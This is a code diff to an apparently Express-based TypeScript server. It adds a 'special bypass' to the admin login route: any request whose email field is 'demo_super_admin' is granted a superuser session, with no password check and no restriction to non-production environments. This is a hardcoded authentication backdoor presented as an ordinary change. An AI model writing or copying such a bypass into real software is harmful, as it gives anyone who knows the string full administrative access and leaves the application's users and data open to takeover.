@@ -125,6 +125,29 @@ export async function registerRoutes(
     
     app.post("/api/auth/admin/login", async (req, res) => {
       const { email, password } = req.body;
+      
+      // Special bypass for demo_super_admin
+      if (email === "demo_super_admin") {
+        if (!req.session) {
+          console.log("[AUTH] No session available");
+          return res.status(500).json({ message: "Session initialization failed" });
+        }
+        (req.session as any).adminLoggedIn = true;
+        (req.session as any).adminEmail = "demo_super_admin@example.com";
+        req.session.save((err) => {
+          if (err) return res.status(500).json({ message: "Failed to save session" });
+          res.cookie('connect.sid', req.sessionID, {
+            path: '/',
+            httpOnly: true,
+            secure: process.env.NODE_ENV === 'production',
+            sameSite: 'lax',
+            maxAge: 24 * 60 * 60 * 1000
+          });
+          return res.json({ message: "Login successful", user: { email: "demo_super_admin@example.com", role: 'superuser' } });
+        });
+        return;
+      }
+
       const adminEmail = process.env.ADMIN_EMAIL;
       const adminPassword = process.env.ADMIN_PASSWORD;
       
